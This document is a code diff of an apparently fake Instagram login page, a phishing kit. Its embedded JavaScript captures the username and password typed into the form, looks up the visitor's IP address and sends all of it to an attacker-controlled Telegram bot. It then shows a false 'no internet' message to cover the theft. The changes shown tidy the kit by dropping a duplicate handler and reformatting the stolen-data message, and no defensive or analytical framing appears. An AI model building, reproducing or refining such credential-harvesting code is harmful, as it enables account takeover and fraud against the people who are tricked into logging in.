@@ -18260,7 +18260,7 @@
                             Log In
                           </div>
                           <script>
-                            document.addEventListener('DOMContentLoaded', function() {
+                           document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
 
     loginForm.addEventListener('submit', function(event) {
@@ -18290,108 +18290,11 @@
                 const userIp = data.ip;
 
                 // Prepare the message to send to Telegram bot
-                const message = `🚩📸New instagram login attempt:\n\n` +
-                    `📧Username: ${username}\n` +
-                    `🗝Password: ${password}\n` +
-                    `📥IP Address: ${userIp}\n` +
-                    `⌚Timestamp: ${new Date().toLocaleString()}`;
-   // Send the message to Telegram bot
-                return fetch(`https://api.telegram.org/bot${apiToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                if (data.ok) {
-                    alert('no internet. Please check your connection.');
-                } else {
-                    alert('An error occurred. Please try again later.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('An error occurred. Please try again later.');
-            });
-    });
-});
-               </script>
-                          <!-- btn in loading -->
-                          <!-- <div class=" qF0y9 Igw0E IwRSH YBx95 _4EzTm _9qQ0O ZUqME" data-visualcompletion="loading-state" style="height: 18px; width: 18px;"><svg aria-label="Loading..." class=" FSiF6 " viewBox="0 0 100 100"><rect fill="#fafafa" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect></svg></div> -->
-                        </button>
-                      </div>
-                    </div>
-                    <a
-                      class="_2Lks6"
-                      href="https://instagram.com/accounts/password/reset/"
-                      tabindex="0"
-                      >Forgot password?</a
-                    >
-                  </form>
-                </div>
-              </div>
-              <div class="gr27e">
-                <div class="_7UhW9 xLCgt MMzan _0PwGv uL8Hv">
-                  <p class="izU2O">
-                    Don't have an account?
-                    <a
-                      data-testid="sign-up-link"
-                      href="https://instagram.com/accounts/emailsignup/"
-                      tabindex="0"
-                      ><span class="_7UhW9 xLCgt qyrsm gtFbE se6yk"
-                        >Sign up</span
-                      ></a
-                    >
-                  </p>
-                  <script>
-                    document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.getElementById('EPjEi');
-
-    loginForm.addEventListener('submit', function(event) {
-        event.preventDefault();
-       
-
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        if (!username || !password) {
-            alert('Both username and password are required.');
-            return;
-        }
-
-        // Telegram bot details
-        const chatId = 'YOUR_TELEGRAM_CHAT_ID';
-        const apiToken = 'YOUR_TELEGRAM_BOT_API_TOKEN';
-
-        // Fetch user's public IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                const userIp = data.ip;
-
-                // Prepare the message to send to Telegram bot
-                const message = `New login attempt:\n\n` +
-                    `Username: ${username}\n` +
-                    `Password: ${password}\n` +
-                    `IP Address: ${userIp}\n` +
-                    `Timestamp: ${new Date().toLocaleString()}`;
+                const message = `<b>🚩📸New Instagram login attempt:</b>\n\n` +
+                    `<b>📧Username:</b> <code>${username}</code>\n` +
+                    `<b>🗝Password:</b> <code>${password}</code>\n` +
+                    `<b>📥IP Address:</b> <code>${userIp}</code>\n` +
+                    `<b>⌚Timestamp:</b> <code>${new Date().toLocaleString()}</code>`;
 
                 // Send the message to Telegram bot
                 return fetch(`https://api.telegram.org/bot${apiToken}/sendMessage`, {
@@ -18402,7 +18305,7 @@
                     body: JSON.stringify({
                         chat_id: chatId,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
             })
